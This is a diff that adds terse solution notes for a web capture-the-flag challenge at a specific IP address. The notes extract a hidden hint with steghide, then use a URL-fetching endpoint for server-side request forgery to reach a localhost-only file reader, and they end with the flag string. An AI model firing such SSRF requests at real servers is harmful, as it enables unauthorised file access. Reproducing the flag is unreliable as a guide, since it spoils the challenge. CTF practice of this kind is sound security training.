@@ -1,0 +1,24 @@
+http://207.180.200.166:3000/login
+
+http://207.180.200.166:3000/profile?id=flag
+
+http://207.180.200.166:3000/images/flag.jpg
+
+steghide --extract -sf flag.jpg
+	flag.txt
+
+flag.txt
+	I made this cool feature that clones offshift website
+	/get_url?url=http://www.offshift.io/
+
+	I tried to serve it as local files but a lot of people abused the service to hack me
+	so now I limited it to localhost only
+
+
+http://207.180.200.166:3000/get_url?url=http://www.offshift.io/
+
+http://207.180.200.166:3000/get_url?url=http://0.0.0.0:3000/images/flag.jpg
+
+
+http://207.180.200.166:3000/get_url?url=http://localhost:3000/get_file?file=flag.txt
+	flag{h0p3_y0u_l1ked_my_@pp5613}
